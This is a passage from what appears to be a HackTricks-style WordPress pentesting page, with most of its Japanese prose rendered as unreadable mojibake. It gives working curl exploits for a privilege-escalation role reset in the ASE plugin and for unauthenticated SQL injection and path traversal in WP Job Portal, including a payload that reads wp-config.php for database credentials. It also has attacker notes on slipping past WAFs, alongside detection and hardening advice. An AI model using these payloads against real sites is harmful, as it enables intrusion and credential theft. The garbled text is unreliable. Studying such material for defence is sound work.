- ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ã€ä»¥å‰ã®åˆ©ç”¨æ™‚ã« user meta ã«å¤ã„é«˜æ¨©é™ãƒ­ãƒ¼ãƒ«ãŒä¿å­˜ã•ã‚Œã¦ã„ã‚‹ã“ã¨ã€‚
- ä»»æ„ã®èªè¨¼æ¸ˆã¿ã‚»ãƒƒã‚·ãƒ§ãƒ³ã€‚ãƒªã‚»ãƒƒãƒˆãƒ•ãƒ­ãƒ¼ã§ nonce/capability ãŒæ¬ å¦‚ã—ã¦ã„ã‚‹ã“ã¨ã€‚

æ‚ªç”¨ï¼ˆä¾‹ï¼‰
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
è„†å¼±ãªãƒ“ãƒ«ãƒ‰ã§ã¯ã€ã“ã‚Œã¯ç¾åœ¨ã®ãƒ­ãƒ¼ãƒ«ã‚’å‰Šé™¤ã—ã€ä¿å­˜ã•ã‚ŒãŸå…ƒã®ãƒ­ãƒ¼ãƒ«ï¼ˆä¾‹: `administrator`ï¼‰ã‚’å†è¿½åŠ ã™ã‚‹ã“ã¨ã§ã€å®Ÿè³ªçš„ã«æ¨©é™ã‚’æ˜‡æ ¼ã•ã›ã¾ã™ã€‚

Detection checklist

- ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ¡ã‚¿ã«â€œå…ƒã®ãƒ­ãƒ¼ãƒ«â€ã‚’æ°¸ç¶šåŒ–ã™ã‚‹ãƒ­ãƒ¼ãƒ«åˆ‡æ›¿æ©Ÿèƒ½ï¼ˆä¾‹: `_asenha_view_admin_as_original_roles`ï¼‰ã‚’æ¢ã™ã€‚
- ãƒªã‚»ãƒƒãƒˆ/å¾©å…ƒç”¨ã®ãƒ‘ã‚¹ã§ä»¥ä¸‹ã‚’æº€ãŸã™ã‚‚ã®ã‚’ç‰¹å®šã™ã‚‹:
  - ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’ `$_REQUEST` / `$_GET` / `$_POST` ã‹ã‚‰èª­ã¿å–ã‚‹ã€‚
  - `current_user_can()` ãŠã‚ˆã³ `wp_verify_nonce()` / `check_admin_referer()` ãªã—ã§ `add_role()` / `remove_role()` ã‚’ä½¿ã£ã¦ãƒ­ãƒ¼ãƒ«ã‚’å¤‰æ›´ã™ã‚‹ã€‚
  - ã‚¢ã‚¯ã‚¿ãƒ¼ã® capabilities ã§ã¯ãªãã€ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³é…åˆ—ï¼ˆä¾‹: `viewing_admin_as_role_are`ï¼‰ã«åŸºã¥ã„ã¦èªå¯ã™ã‚‹ã€‚

Hardening

- çŠ¶æ…‹ã‚’å¤‰æ›´ã™ã‚‹ã™ã¹ã¦ã®åˆ†å²ã§ capability ãƒã‚§ãƒƒã‚¯ã‚’å¼·åˆ¶ã™ã‚‹ï¼ˆä¾‹: `current_user_can('manage_options')` ã‚ã‚‹ã„ã¯ãã‚Œã‚ˆã‚Šå³æ ¼ãªãƒã‚§ãƒƒã‚¯ï¼‰ã€‚
- ã™ã¹ã¦ã®ãƒ­ãƒ¼ãƒ«/æ¨©é™å¤‰æ›´ã«å¯¾ã—ã¦ nonces ã‚’è¦æ±‚ã—ã€ãã‚Œã‚‰ã‚’æ¤œè¨¼ã™ã‚‹: `check_admin_referer()` / `wp_verify_nonce()`ã€‚
- ãƒªã‚¯ã‚¨ã‚¹ãƒˆç”±æ¥ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’æ±ºã—ã¦ä¿¡ç”¨ã›ãšã€èªè¨¼æ¸ˆã¿ã‚¢ã‚¯ã‚¿ãƒ¼ã¨æ˜ç¢ºãªãƒãƒªã‚·ãƒ¼ã«åŸºã¥ã„ã¦ã‚µãƒ¼ãƒãƒ¼å´ã§å¯¾è±¡ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’è§£æ±ºã™ã‚‹ã€‚
- ãƒ—ãƒ­ãƒ•ã‚¡ã‚¤ãƒ«/ãƒ­ãƒ¼ãƒ«ãŒæ›´æ–°ã•ã‚ŒãŸéš›ã«â€œå…ƒã®ãƒ­ãƒ¼ãƒ«â€çŠ¶æ…‹ã‚’ç„¡åŠ¹åŒ–ã—ã¦ã€å¤ã„é«˜æ¨©é™ã®å¾©å…ƒã‚’é˜²ã:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- ä¸€æ™‚çš„ãªãƒ­ãƒ¼ãƒ«åˆ‡ã‚Šæ›¿ãˆã«ã¯ã€æœ€å°é™ã®çŠ¶æ…‹ã‚’ä¿æŒã—ã€æ™‚é–“åˆ¶é™ä»˜ãã®æ¨©é™ä¿è­·ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚’æ¤œè¨ã™ã‚‹ã€‚

---

### WordPress/ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã®CVEã«å¯¾ã™ã‚‹WAFã®è€ƒæ…®äº‹é …

ä¸€èˆ¬çš„ãªã‚¨ãƒƒã‚¸/ã‚µãƒ¼ãƒãƒ¼WAFã¯ã€åºƒç¯„ãªãƒ‘ã‚¿ãƒ¼ãƒ³ï¼ˆSQLiã€XSSã€LFIï¼‰ã«å¯¾ã—ã¦èª¿æ•´ã•ã‚Œã¦ã„ã¾ã™ã€‚å¤šãã®é«˜å½±éŸ¿ãªWordPress/ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã®è„†å¼±æ€§ã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å›ºæœ‰ã®ãƒ­ã‚¸ãƒƒã‚¯ã‚„èªå¯ã®ãƒã‚°ã§ã‚ã‚Šã€ã‚¨ãƒ³ã‚¸ãƒ³ãŒWordPressã®ãƒ«ãƒ¼ãƒˆã‚„ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã®ã‚»ãƒãƒ³ãƒ†ã‚£ã‚¯ã‚¹ã‚’ç†è§£ã—ã¦ã„ãªã„é™ã‚Šã€æ­£å½“ãªãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã®ã‚ˆã†ã«è¦‹ãˆã¾ã™ã€‚

æ”»æ’ƒè€…å‘ã‘ãƒ¡ãƒ¢

- ãƒ—ãƒ©ã‚°ã‚¤ãƒ³å›ºæœ‰ã®ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’ã‚¯ãƒªãƒ¼ãƒ³ãªãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã§ç‹™ã†: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- ã¾ãšæœªèªè¨¼ãƒ‘ã‚¹ã‚’è©¦ã™ï¼ˆAJAX `nopriv`, RESTã§æ¨©é™ãŒç·©ã„ `permission_callback`, å…¬é–‹shortcodesï¼‰ã€‚ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯é›£èª­åŒ–ãªã—ã§æˆåŠŸã™ã‚‹ã“ã¨ãŒå¤šã„ã€‚
- å…¸å‹çš„ãªé«˜å½±éŸ¿ã‚±ãƒ¼ã‚¹: æ¨©é™æ˜‡æ ¼ï¼ˆã‚¢ã‚¯ã‚»ã‚¹åˆ¶å¾¡ã®ç ´ç¶»ï¼‰ã€ä»»æ„ãƒ•ã‚¡ã‚¤ãƒ«ã®ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰/ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã€LFIã€ã‚ªãƒ¼ãƒ—ãƒ³ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆã€‚

é˜²å¾¡ãƒãƒ¼ãƒˆ

- ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã®CVEä¿è­·ã«æ±ç”¨WAFã‚·ã‚°ãƒãƒãƒ£ã‚’é ¼ã£ã¦ã¯ã„ã‘ãªã„ã€‚ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å±¤ã§è„†å¼±æ€§å›ºæœ‰ã®ä»®æƒ³ãƒ‘ãƒƒãƒã‚’å®Ÿè£…ã™ã‚‹ã‹ã€ç´ æ—©ãã‚¢ãƒƒãƒ—ãƒ‡ãƒ¼ãƒˆã™ã‚‹ã“ã¨ã€‚
- ã‚³ãƒ¼ãƒ‰å†…ã§ã¯ãƒã‚¬ãƒ†ã‚£ãƒ–ãªæ­£è¦è¡¨ç¾ãƒ•ã‚£ãƒ«ã‚¿ã‚ˆã‚Šã‚‚ã€ãƒã‚¸ãƒ†ã‚£ãƒ–ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒã‚§ãƒƒã‚¯ï¼ˆcapabilitiesã€noncesã€å³æ ¼ãªå…¥åŠ›æ¤œè¨¼ï¼‰ã‚’å„ªå…ˆã™ã‚‹ã€‚

## WordPressã®ä¿è­·

### å®šæœŸçš„ãªæ›´æ–°

WordPressã€ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã€ãƒ†ãƒ¼ãƒãŒæœ€æ–°ã§ã‚ã‚‹ã“ã¨ã‚’ç¢ºèªã™ã‚‹ã€‚ã¾ãŸã€wp-config.phpã§è‡ªå‹•æ›´æ–°ãŒæœ‰åŠ¹ã«ãªã£ã¦ã„ã‚‹ã“ã¨ã‚’ç¢ºèªã™ã‚‹:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
ã¾ãŸã€**ä¿¡é ¼ã§ãã‚‹ WordPress ã®ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¨ãƒ†ãƒ¼ãƒã®ã¿ã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¦ãã ã•ã„**ã€‚

### ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ—ãƒ©ã‚°ã‚¤ãƒ³

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **ãã®ä»–ã®æ¨å¥¨äº‹é …**

- ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã® **admin** ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’å‰Šé™¤ã™ã‚‹
- å¼·åŠ›ãª **ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰** ã¨ **2FA** ã‚’ä½¿ç”¨ã™ã‚‹
- å®šæœŸçš„ã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã® **æ¨©é™** ã‚’è¦‹ç›´ã™
- Brute Force attacks ã‚’é˜²ããŸã‚ã« **ãƒ­ã‚°ã‚¤ãƒ³è©¦è¡Œå›æ•°ã‚’åˆ¶é™ã™ã‚‹**
- ãƒ•ã‚¡ã‚¤ãƒ« **`wp-admin.php`** ã®åå‰ã‚’å¤‰æ›´ã—ã€å†…éƒ¨ã¾ãŸã¯ç‰¹å®šã®IPã‚¢ãƒ‰ãƒ¬ã‚¹ã‹ã‚‰ã®ã¿ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯ã™ã‚‹ã€‚


### æ¤œè¨¼ä¸è¶³ã«ã‚ˆã‚‹æœªèªè¨¼ SQL Injection (WP Job Portal <= 2.3.2)

WP Job Portal ã® recruitment ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¯ **savecategory** ã‚¿ã‚¹ã‚¯ã‚’å…¬é–‹ã—ã¦ãŠã‚Šã€æœ€çµ‚çš„ã«ä»¥ä¸‹ã®è„†å¼±ãªã‚³ãƒ¼ãƒ‰ã‚’ `modules/category/model.php::validateFormData()` å†…ã§å®Ÿè¡Œã—ã¾ã™ï¼š
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
ã“ã®ã‚¹ãƒ‹ãƒšãƒƒãƒˆã«ã‚ˆã£ã¦å°å…¥ã•ã‚ŒãŸå•é¡Œ:

1. **Unsanitised user input** â€“ `parentid` ã¯ HTTP ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‹ã‚‰ãã®ã¾ã¾æ¥ã¦ã„ã‚‹ã€‚
2. **String concatenation inside the WHERE clause** â€“ `is_numeric()` / `esc_sql()` / ãƒ—ãƒªãƒšã‚¢ãƒ‰ã‚¹ãƒ†ãƒ¼ãƒˆãƒ¡ãƒ³ãƒˆãŒä½¿ã‚ã‚Œã¦ã„ãªã„ã€‚
3. **Unauthenticated reachability** â€“ ã“ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã¯ `admin-post.php` ã‚’é€šã—ã¦å®Ÿè¡Œã•ã‚Œã‚‹ãŒã€å”¯ä¸€ã®ãƒã‚§ãƒƒã‚¯ã¯ **CSRF nonce** (`wp_verify_nonce()` ) ã§ã‚ã‚Šã€ã“ã‚Œã¯ã‚·ãƒ§ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰ `[wpjobportal_my_resumes]` ã‚’åŸ‹ã‚è¾¼ã‚“ã å…¬é–‹ãƒšãƒ¼ã‚¸ã‹ã‚‰ä»»æ„ã®è¨ªå•è€…ãŒå–å¾—ã§ãã‚‹ã€‚

#### Exploitation

1. æ–°ã—ã„ nonce ã‚’å–å¾—:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. `parentid` ã‚’æ‚ªç”¨ã—ã¦ä»»æ„ã® SQL ã‚’æ³¨å…¥:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã¯æ³¨å…¥ã•ã‚ŒãŸã‚¯ã‚¨ãƒªã®çµæœã‚’éœ²å‡ºã™ã‚‹ã‹ã€ã‚ã‚‹ã„ã¯ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’å¤‰æ›´ã—ã€SQLi ã‚’ç«‹è¨¼ã™ã‚‹ã€‚


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

åˆ¥ã®ã‚¿ã‚¹ã‚¯ã€**downloadcustomfile** ã¯ãƒ‘ã‚¹ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ã‚’ä»‹ã—ã¦è¨ªå•è€…ã« **ãƒ‡ã‚£ã‚¹ã‚¯ä¸Šã®ä»»æ„ã®ãƒ•ã‚¡ã‚¤ãƒ«** ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã•ã›ã‚‹ã“ã¨ã‚’è¨±ã—ã¦ã„ãŸã€‚è„†å¼±ãªã‚·ãƒ³ã‚¯ã¯ `modules/customfield/model.php::downloadCustomUploadedFile()` ã«ã‚ã‚‹:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` ã¯æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã—ã¦ãŠã‚Šã€**without sanitisation** ã®ã¾ã¾é€£çµã•ã‚Œã¦ã„ã¾ã™ã€‚ç¹°ã‚Šè¿”ã—ã¾ã™ãŒã€å”¯ä¸€ã®é˜²å¾¡ã¯å±¥æ­´æ›¸ãƒšãƒ¼ã‚¸ã‹ã‚‰å–å¾—ã§ãã‚‹**CSRF nonce**ã§ã™ã€‚

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
ã‚µãƒ¼ãƒãƒ¼ã¯ `wp-config.php` ã®å†…å®¹ã‚’è¿”ã—ã€leaking DB credentials and auth keysã€‚

## å‚è€ƒ

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset â€“ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments â‰¤ 5.6.1 â€“ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privileged-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)

{{#include ../../banners/hacktricks-training.md}}
